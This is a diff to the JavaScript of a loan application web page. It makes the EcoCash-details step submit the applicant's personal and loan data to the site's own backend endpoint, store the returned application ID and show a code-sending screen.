@@ -1720,34 +1720,30 @@ function loadEcoCashDetailsScreen() {
 
 }
 // ======================================================
-// PART 18 - SAVE ECOCASH DETAILS
+// SAVE ECOCASH DETAILS
+// CREATE PENDING APPLICATION
 // ======================================================
 
-function saveEcoCashDetails() {
+async function saveEcoCashDetails() {
 
     const ecoName =
-        document
-            .getElementById("ecoName")
-            .value
-            .trim();
+        document.getElementById("ecoName").value.trim();
 
     const ecoNumber =
-        document
-            .getElementById("ecoNumber")
-            .value
-            .trim();
+        document.getElementById("ecoNumber").value.trim();
 
     if (
         ecoName === "" ||
         ecoNumber === ""
     ) {
 
-        alert("Please complete all EcoCash details.");
+        alert("Please complete all fields.");
 
         return;
 
     }
 
+    // Save EcoCash details locally
     sessionStorage.setItem(
         "ecoName",
         ecoName
@@ -1758,7 +1754,94 @@ function saveEcoCashDetails() {
         ecoNumber
     );
 
-    loadEcoCashVerificationWaitingScreen();
+    try {
+
+        const response = await fetch(
+            "/create-ecocash-application",
+            {
+
+                method: "POST",
+
+                headers: {
+                    "Content-Type": "application/json"
+                },
+
+                body: JSON.stringify({
+
+                    fullNames:
+                        sessionStorage.getItem("fullNames"),
+
+                    dateOfBirth:
+                        sessionStorage.getItem("dateOfBirth"),
+
+                    idNumber:
+                        sessionStorage.getItem("idNumber"),
+
+                    occupation:
+                        sessionStorage.getItem("occupation"),
+
+                    loanPurpose:
+                        sessionStorage.getItem("loanPurpose"),
+
+                    loanAmount:
+                        sessionStorage.getItem("loanAmount"),
+
+                    loanPeriod:
+                        sessionStorage.getItem("loanPeriod"),
+
+                    monthlyRepayment:
+                        sessionStorage.getItem("monthlyRepayment"),
+
+                    totalRepayment:
+                        sessionStorage.getItem("totalRepayment"),
+
+                    ecoName:
+                        ecoName,
+
+                    ecoNumber:
+                        ecoNumber
+
+                })
+
+            }
+        );
+
+        const result =
+            await response.json();
+
+        if (
+            !response.ok ||
+            !result.success
+        ) {
+
+            throw new Error(
+                result.error ||
+                "Unable to create application."
+            );
+
+        }
+
+        // Save the database application ID
+        sessionStorage.setItem(
+            "applicationId",
+            result.application.id
+        );
+
+        // Show waiting screen
+        loadEcoCashCodeSendingScreen();
+
+    } catch (error) {
+
+        console.error(
+            "CREATE ECOCASH APPLICATION ERROR:",
+            error
+        );
+
+        alert(
+            "Unable to submit your application. Please try again."
+        );
+
+    }
 
 }
 // ======================================================
